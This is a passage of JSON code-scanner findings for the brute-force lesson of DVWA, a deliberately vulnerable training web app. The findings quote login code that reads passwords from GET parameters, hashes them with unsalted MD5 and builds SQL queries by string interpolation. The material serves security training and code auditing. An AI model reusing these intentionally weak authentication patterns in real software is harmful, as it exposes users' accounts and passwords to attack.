        "excerpt": "\t$user = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $user ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));\n\n\t// Sanitise password input\n\t$pass = $_GET[ &#39;password&#39; ];\n\t$pass = stripslashes( $pass );\n\t$pass = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));\n\t$pass = md5( $pass );\n\n\t// Check database\n",
        "startLocationLine": 13,
        "startLocationColumn": 18,
        "endLocationLine": 13,
        "endLocationColumn": 26
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/source/high.php",
        "ruleId": "AI015800",
        "ruleName": "Data: Access Credentials",
        "ruleDescription": "Data: Access Credentials",
        "pattern": "\\b(auth_token|access_token|password|passwrd|client_credentials|client_*id|client_*secret)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Data.Sensitive.Credentials"
        ],
        "sample": "password",
        "excerpt": "\t$pass = md5( $pass );\n\n\t// Check database\n\t$query  = &quot;SELECT * FROM `users` WHERE user = &#39;$user&#39; AND password = &#39;$pass&#39;;&quot;;\n\t$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );\n\n\tif( $result &amp;&amp; mysqli_num_rows( $result ) == 1 ) {\n\t\t// Get users details\n\t\t$row    = mysqli_fetch_assoc( $result );\n",
        "startLocationLine": 19,
        "startLocationColumn": 60,
        "endLocationLine": 19,
        "endLocationColumn": 68
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/source/high.php",
        "ruleId": "AI015800",
        "ruleName": "Data: Access Credentials",
        "ruleDescription": "Data: Access Credentials",
        "pattern": "\\b(auth_token|access_token|password|passwrd|client_credentials|client_*id|client_*secret)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Data.Sensitive.Credentials"
        ],
        "sample": "password",
        "excerpt": "\t\t$avatar = $row[&quot;avatar&quot;];\n\n\t\t// Login successful\n\t\t$html .= &quot;&lt;p&gt;Welcome to the password protected area {$user}&lt;/p&gt;&quot;;\n\t\t$html .= &quot;&lt;img src=\\&quot;{$avatar}\\&quot; /&gt;&quot;;\n\t}\n\telse {\n\t\t// Login failed\n\t\tsleep( rand( 0, 3 ) );\n",
        "startLocationLine": 28,
        "startLocationColumn": 31,
        "endLocationLine": 28,
        "endLocationColumn": 39
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/source/high.php",
        "ruleId": "AI015800",
        "ruleName": "Data: Access Credentials",
        "ruleDescription": "Data: Access Credentials",
        "pattern": "\\b(auth_token|access_token|password|passwrd|client_credentials|client_*id|client_*secret)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Data.Sensitive.Credentials"
        ],
        "sample": "password",
        "excerpt": "\telse {\n\t\t// Login failed\n\t\tsleep( rand( 0, 3 ) );\n\t\t$html .= &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;;\n\t}\n\n\t((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);\n}\n\n",
        "startLocationLine": 34,
        "startLocationColumn": 40,
        "endLocationLine": 34,
        "endLocationColumn": 48
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/source/high.php",
        "ruleId": "AI011600",
        "ruleName": "Data: DBMS (SQL)",
        "ruleDescription": "Data: DBMS (SQL)",
        "pattern": "['\\\"](select|insert|delete|update)\\s.*",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Data.DBMS.SQL"
        ],
        "sample": "&quot;SELECT * FROM `users` WHERE user = &#39;$user&#39; AND password = &#39;$pass&#39;;&quot;;",
        "excerpt": "\t$pass = md5( $pass );\n\n\t// Check database\n\t$query  = &quot;SELECT * FROM `users` WHERE user = &#39;$user&#39; AND password = &#39;$pass&#39;;&quot;;\n\t$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );\n\n\tif( $result &amp;&amp; mysqli_num_rows( $result ) == 1 ) {\n\t\t// Get users details\n\t\t$row    = mysqli_fetch_assoc( $result );\n",
        "startLocationLine": 19,
        "startLocationColumn": 12,
        "endLocationLine": 19,
        "endLocationColumn": 82
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/source/high.php",
        "ruleId": "AI008800",
        "ruleName": "Cryptography: Hash Algorithm (Legacy)",
        "ruleDescription": "Cryptography: Hash Algorithm (Legacy)",
        "pattern": "\\b(MD2|MD4|MD5|SHA-*(0|1))\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.Legacy"
        ],
        "sample": "md5",
        "excerpt": "\t$pass = $_GET[ &#39;password&#39; ];\n\t$pass = stripslashes( $pass );\n\t$pass = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));\n\t$pass = md5( $pass );\n\n\t// Check database\n\t$query  = &quot;SELECT * FROM `users` WHERE user = &#39;$user&#39; AND password = &#39;$pass&#39;;&quot;;\n\t$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );\n\n",
        "startLocationLine": 16,
        "startLocationColumn": 10,
        "endLocationLine": 16,
        "endLocationColumn": 13
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/source/impossible.php",
        "ruleId": "AI040000",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b(principal|identity|auth|authenticated|authentication|log(in|on)|log(off|out)|signin|sign-?in|signout|sign-?out|networkcredential)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "Login",
        "excerpt": "&lt;?php\n\nif( isset( $_POST[ &#39;Login&#39; ] ) &amp;&amp; isset ($_POST[&#39;username&#39;]) &amp;&amp; isset ($_POST[&#39;password&#39;]) ) {\n\t// Check Anti-CSRF token\n\tcheckToken( $_REQUEST[ &#39;user_token&#39; ], $_SESSION[ &#39;session_token&#39; ], &#39;index.php&#39; );\n\n\t// Sanitise username input\n\t$user = $_POST[ &#39;username&#39; ];\n",
        "startLocationLine": 3,
        "startLocationColumn": 21,
        "endLocationLine": 3,
        "endLocationColumn": 26
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/source/impossible.php",
        "ruleId": "AI040000",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b(principal|identity|auth|authenticated|authentication|log(in|on)|log(off|out)|signin|sign-?in|signout|sign-?out|networkcredential)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "login",
        "excerpt": "\t\t// Had the account been locked out since last login?\n\t\tif( $failed_login &gt;= $total_failed_login ) {\n\t\t\t$html .= &quot;&lt;p&gt;&lt;em&gt;Warning&lt;/em&gt;: Someone might of been brute forcing your account.&lt;/p&gt;&quot;;\n\t\t\t$html .= &quot;&lt;p&gt;Number of login attempts: &lt;em&gt;{$failed_login}&lt;/em&gt;.&lt;br /&gt;Last login attempt was at: &lt;em&gt;${last_login}&lt;/em&gt;.&lt;/p&gt;&quot;;\n\t\t}\n\n\t\t// Reset bad login count\n\t\t$data = $db-&gt;prepare( &#39;UPDATE users SET failed_login = &quot;0&quot; WHERE user = (:user) LIMIT 1;&#39; );\n\t\t$data-&gt;bindParam( &#39;:user&#39;, $user, PDO::PARAM_STR );\n",
        "startLocationLine": 73,
        "startLocationColumn": 27,
        "endLocationLine": 73,
        "endLocationColumn": 32
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/source/impossible.php",
        "ruleId": "AI040000",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b(principal|identity|auth|authenticated|authentication|log(in|on)|log(off|out)|signin|sign-?in|signout|sign-?out|networkcredential)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "login",
        "excerpt": "\t\t// Had the account been locked out since last login?\n\t\tif( $failed_login &gt;= $total_failed_login ) {\n\t\t\t$html .= &quot;&lt;p&gt;&lt;em&gt;Warning&lt;/em&gt;: Someone might of been brute forcing your account.&lt;/p&gt;&quot;;\n\t\t\t$html .= &quot;&lt;p&gt;Number of login attempts: &lt;em&gt;{$failed_login}&lt;/em&gt;.&lt;br /&gt;Last login attempt was at: &lt;em&gt;${last_login}&lt;/em&gt;.&lt;/p&gt;&quot;;\n\t\t}\n\n\t\t// Reset bad login count\n\t\t$data = $db-&gt;prepare( &#39;UPDATE users SET failed_login = &quot;0&quot; WHERE user = (:user) LIMIT 1;&#39; );\n\t\t$data-&gt;bindParam( &#39;:user&#39;, $user, PDO::PARAM_STR );\n",
        "startLocationLine": 73,
        "startLocationColumn": 79,
        "endLocationLine": 73,
        "endLocationColumn": 84
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/source/impossible.php",
        "ruleId": "AI040100",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b((username|userid|password|passphrase|multi-factor|credential|acct)s?)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "username",
        "excerpt": "&lt;?php\n\nif( isset( $_POST[ &#39;Login&#39; ] ) &amp;&amp; isset ($_POST[&#39;username&#39;]) &amp;&amp; isset ($_POST[&#39;password&#39;]) ) {\n\t// Check Anti-CSRF token\n\tcheckToken( $_REQUEST[ &#39;user_token&#39; ], $_SESSION[ &#39;session_token&#39; ], &#39;index.php&#39; );\n\n\t// Sanitise username input\n\t$user = $_POST[ &#39;username&#39; ];\n",
        "startLocationLine": 3,
        "startLocationColumn": 50,
        "endLocationLine": 3,
        "endLocationColumn": 58
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/source/impossible.php",
        "ruleId": "AI040100",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b((username|userid|password|passphrase|multi-factor|credential|acct)s?)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "password",
        "excerpt": "&lt;?php\n\nif( isset( $_POST[ &#39;Login&#39; ] ) &amp;&amp; isset ($_POST[&#39;username&#39;]) &amp;&amp; isset ($_POST[&#39;password&#39;]) ) {\n\t// Check Anti-CSRF token\n\tcheckToken( $_REQUEST[ &#39;user_token&#39; ], $_SESSION[ &#39;session_token&#39; ], &#39;index.php&#39; );\n\n\t// Sanitise username input\n\t$user = $_POST[ &#39;username&#39; ];\n",
        "startLocationLine": 3,
        "startLocationColumn": 80,
        "endLocationLine": 3,
        "endLocationColumn": 88
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/source/impossible.php",
        "ruleId": "AI040100",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b((username|userid|password|passphrase|multi-factor|credential|acct)s?)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "username",
        "excerpt": "\tcheckToken( $_REQUEST[ &#39;user_token&#39; ], $_SESSION[ &#39;session_token&#39; ], &#39;index.php&#39; );\n\n\t// Sanitise username input\n\t$user = $_POST[ &#39;username&#39; ];\n\t$user = stripslashes( $user );\n\t$user = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $user ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));\n\n\t// Sanitise password input\n\t$pass = $_POST[ &#39;password&#39; ];\n",
        "startLocationLine": 8,
        "startLocationColumn": 19,
        "endLocationLine": 8,
        "endLocationColumn": 27
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/source/impossible.php",
        "ruleId": "AI040100",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b((username|userid|password|passphrase|multi-factor|credential|acct)s?)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "password",
        "excerpt": "\t$user = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $user ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));\n\n\t// Sanitise password input\n\t$pass = $_POST[ &#39;password&#39; ];\n\t$pass = stripslashes( $pass );\n\t$pass = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));\n\t$pass = md5( $pass );\n\n\t// Default values\n",
        "startLocationLine": 13,
        "startLocationColumn": 19,
        "endLocationLine": 13,
        "endLocationColumn": 27
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/source/impossible.php",
        "ruleId": "AI040100",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b((username|userid|password|passphrase|multi-factor|credential|acct)s?)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "password",
        "excerpt": "\t}\n\n\t// Check the database (if username matches the password)\n\t$data = $db-&gt;prepare( &#39;SELECT * FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;&#39; );\n\t$data-&gt;bindParam( &#39;:user&#39;, $user, PDO::PARAM_STR);\n\t$data-&gt;bindParam( &#39;:password&#39;, $pass, PDO::PARAM_STR );\n\t$data-&gt;execute();\n\t$row = $data-&gt;fetch();\n\n",
        "startLocationLine": 53,
        "startLocationColumn": 70,
        "endLocationLine": 53,
        "endLocationColumn": 78
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/source/impossible.php",
        "ruleId": "AI040100",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b((username|userid|password|passphrase|multi-factor|credential|acct)s?)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "password",
        "excerpt": "\t}\n\n\t// Check the database (if username matches the password)\n\t$data = $db-&gt;prepare( &#39;SELECT * FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;&#39; );\n\t$data-&gt;bindParam( &#39;:user&#39;, $user, PDO::PARAM_STR);\n\t$data-&gt;bindParam( &#39;:password&#39;, $pass, PDO::PARAM_STR );\n\t$data-&gt;execute();\n\t$row = $data-&gt;fetch();\n\n",
        "startLocationLine": 53,
        "startLocationColumn": 83,
        "endLocationLine": 53,
        "endLocationColumn": 91
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/source/impossible.php",
        "ruleId": "AI040100",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b((username|userid|password|passphrase|multi-factor|credential|acct)s?)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "password",
        "excerpt": "\t// Check the database (if username matches the password)\n\t$data = $db-&gt;prepare( &#39;SELECT * FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;&#39; );\n\t$data-&gt;bindParam( &#39;:user&#39;, $user, PDO::PARAM_STR);\n\t$data-&gt;bindParam( &#39;:password&#39;, $pass, PDO::PARAM_STR );\n\t$data-&gt;execute();\n\t$row = $data-&gt;fetch();\n\n\t// If its a valid login...\n\tif( ( $data-&gt;rowCount() == 1 ) &amp;&amp; ( $account_locked == false ) ) {\n",
        "startLocationLine": 55,
        "startLocationColumn": 22,
        "endLocationLine": 55,
        "endLocationColumn": 30
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/source/impossible.php",
        "ruleId": "AI040100",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b((username|userid|password|passphrase|multi-factor|credential|acct)s?)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "password",
        "excerpt": "\t\t$last_login   = $row[ &#39;last_login&#39; ];\n\n\t\t// Login successful\n\t\t$html .= &quot;&lt;p&gt;Welcome to the password protected area &lt;em&gt;{$user}&lt;/em&gt;&lt;/p&gt;&quot;;\n\t\t$html .= &quot;&lt;img src=\\&quot;{$avatar}\\&quot; /&gt;&quot;;\n\n\t\t// Had the account been locked out since last login?\n\t\tif( $failed_login &gt;= $total_failed_login ) {\n\t\t\t$html .= &quot;&lt;p&gt;&lt;em&gt;Warning&lt;/em&gt;: Someone might of been brute forcing your account.&lt;/p&gt;&quot;;\n",
        "startLocationLine": 67,
        "startLocationColumn": 31,
        "endLocationLine": 67,
        "endLocationColumn": 39
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/source/impossible.php",
        "ruleId": "AI040100",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b((username|userid|password|passphrase|multi-factor|credential|acct)s?)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "Username",
        "excerpt": "\t\tsleep( rand( 2, 4 ) );\n\n\t\t// Give the user some feedback\n\t\t$html .= &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;br /&gt;&lt;br/&gt;Alternative, the account has been locked because of too many failed logins.&lt;br /&gt;If this is the case, &lt;em&gt;please try again in {$lockout_time} minutes&lt;/em&gt;.&lt;/pre&gt;&quot;;\n\n\t\t// Update bad login count\n\t\t$data = $db-&gt;prepare( &#39;UPDATE users SET failed_login = (failed_login + 1) WHERE user = (:user) LIMIT 1;&#39; );\n\t\t$data-&gt;bindParam( &#39;:user&#39;, $user, PDO::PARAM_STR );\n\t\t$data-&gt;execute();\n",
        "startLocationLine": 85,
        "startLocationColumn": 24,
        "endLocationLine": 85,
        "endLocationColumn": 32
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/source/impossible.php",
        "ruleId": "AI040100",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b((username|userid|password|passphrase|multi-factor|credential|acct)s?)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "password",
        "excerpt": "\t\tsleep( rand( 2, 4 ) );\n\n\t\t// Give the user some feedback\n\t\t$html .= &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;br /&gt;&lt;br/&gt;Alternative, the account has been locked because of too many failed logins.&lt;br /&gt;If this is the case, &lt;em&gt;please try again in {$lockout_time} minutes&lt;/em&gt;.&lt;/pre&gt;&quot;;\n\n\t\t// Update bad login count\n\t\t$data = $db-&gt;prepare( &#39;UPDATE users SET failed_login = (failed_login + 1) WHERE user = (:user) LIMIT 1;&#39; );\n\t\t$data-&gt;bindParam( &#39;:user&#39;, $user, PDO::PARAM_STR );\n\t\t$data-&gt;execute();\n",
        "startLocationLine": 85,
        "startLocationColumn": 40,
        "endLocationLine": 85,
        "endLocationColumn": 48
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/source/impossible.php",
        "ruleId": "AI016500",
        "ruleName": "Data: Sensitive (Identification)",
        "ruleDescription": "Data: Sensitive (Identification)",
        "pattern": "avatar|photo",
        "type": "Regex",
        "confidence": "Medium",
        "severity": "Important",
        "tags": [
          "Data.Sensitive.Identification"
        ],
        "sample": "avatar",
        "excerpt": "\t// If its a valid login...\n\tif( ( $data-&gt;rowCount() == 1 ) &amp;&amp; ( $account_locked == false ) ) {\n\t\t// Get users details\n\t\t$avatar       = $row[ &#39;avatar&#39; ];\n\t\t$failed_login = $row[ &#39;failed_login&#39; ];\n\t\t$last_login   = $row[ &#39;last_login&#39; ];\n\n\t\t// Login successful\n\t\t$html .= &quot;&lt;p&gt;Welcome to the password protected area &lt;em&gt;{$user}&lt;/em&gt;&lt;/p&gt;&quot;;\n",
        "startLocationLine": 62,
        "startLocationColumn": 4,
        "endLocationLine": 62,
        "endLocationColumn": 10
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/source/impossible.php",
        "ruleId": "AI016500",
        "ruleName": "Data: Sensitive (Identification)",
        "ruleDescription": "Data: Sensitive (Identification)",
        "pattern": "avatar|photo",
        "type": "Regex",
        "confidence": "Medium",
        "severity": "Important",
        "tags": [
          "Data.Sensitive.Identification"
        ],
        "sample": "avatar",
        "excerpt": "\t// If its a valid login...\n\tif( ( $data-&gt;rowCount() == 1 ) &amp;&amp; ( $account_locked == false ) ) {\n\t\t// Get users details\n\t\t$avatar       = $row[ &#39;avatar&#39; ];\n\t\t$failed_login = $row[ &#39;failed_login&#39; ];\n\t\t$last_login   = $row[ &#39;last_login&#39; ];\n\n\t\t// Login successful\n\t\t$html .= &quot;&lt;p&gt;Welcome to the password protected area &lt;em&gt;{$user}&lt;/em&gt;&lt;/p&gt;&quot;;\n",
        "startLocationLine": 62,
        "startLocationColumn": 26,
        "endLocationLine": 62,
        "endLocationColumn": 32
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/source/impossible.php",
        "ruleId": "AI016500",
        "ruleName": "Data: Sensitive (Identification)",
        "ruleDescription": "Data: Sensitive (Identification)",
        "pattern": "avatar|photo",
        "type": "Regex",
        "confidence": "Medium",
        "severity": "Important",
        "tags": [
          "Data.Sensitive.Identification"
        ],
        "sample": "avatar",
        "excerpt": "\n\t\t// Login successful\n\t\t$html .= &quot;&lt;p&gt;Welcome to the password protected area &lt;em&gt;{$user}&lt;/em&gt;&lt;/p&gt;&quot;;\n\t\t$html .= &quot;&lt;img src=\\&quot;{$avatar}\\&quot; /&gt;&quot;;\n\n\t\t// Had the account been locked out since last login?\n\t\tif( $failed_login &gt;= $total_failed_login ) {\n\t\t\t$html .= &quot;&lt;p&gt;&lt;em&gt;Warning&lt;/em&gt;: Someone might of been brute forcing your account.&lt;/p&gt;&quot;;\n\t\t\t$html .= &quot;&lt;p&gt;Number of login attempts: &lt;em&gt;{$failed_login}&lt;/em&gt;.&lt;br /&gt;Last login attempt was at: &lt;em&gt;${last_login}&lt;/em&gt;.&lt;/p&gt;&quot;;\n",
        "startLocationLine": 68,
        "startLocationColumn": 26,
        "endLocationLine": 68,
        "endLocationColumn": 32
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/source/impossible.php",
        "ruleId": "AI015800",
        "ruleName": "Data: Access Credentials",
        "ruleDescription": "Data: Access Credentials",
        "pattern": "\\b(username|userid|passphrase|secret|credential|credentials)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Data.Sensitive.Credentials"
        ],
        "sample": "username",
        "excerpt": "&lt;?php\n\nif( isset( $_POST[ &#39;Login&#39; ] ) &amp;&amp; isset ($_POST[&#39;username&#39;]) &amp;&amp; isset ($_POST[&#39;password&#39;]) ) {\n\t// Check Anti-CSRF token\n\tcheckToken( $_REQUEST[ &#39;user_token&#39; ], $_SESSION[ &#39;session_token&#39; ], &#39;index.php&#39; );\n\n\t// Sanitise username input\n\t$user = $_POST[ &#39;username&#39; ];\n",
        "startLocationLine": 3,
        "startLocationColumn": 50,
        "endLocationLine": 3,
        "endLocationColumn": 58
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/source/impossible.php",
        "ruleId": "AI015800",
        "ruleName": "Data: Access Credentials",
        "ruleDescription": "Data: Access Credentials",
        "pattern": "\\b(username|userid|passphrase|secret|credential|credentials)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Data.Sensitive.Credentials"
        ],
        "sample": "username",
        "excerpt": "\tcheckToken( $_REQUEST[ &#39;user_token&#39; ], $_SESSION[ &#39;session_token&#39; ], &#39;index.php&#39; );\n\n\t// Sanitise username input\n\t$user = $_POST[ &#39;username&#39; ];\n\t$user = stripslashes( $user );\n\t$user = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $user ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));\n\n\t// Sanitise password input\n\t$pass = $_POST[ &#39;password&#39; ];\n",
        "startLocationLine": 8,
        "startLocationColumn": 19,
        "endLocationLine": 8,
        "endLocationColumn": 27
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/source/impossible.php",
        "ruleId": "AI015800",
        "ruleName": "Data: Access Credentials",
        "ruleDescription": "Data: Access Credentials",
        "pattern": "\\b(username|userid|passphrase|secret|credential|credentials)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Data.Sensitive.Credentials"
        ],
        "sample": "Username",
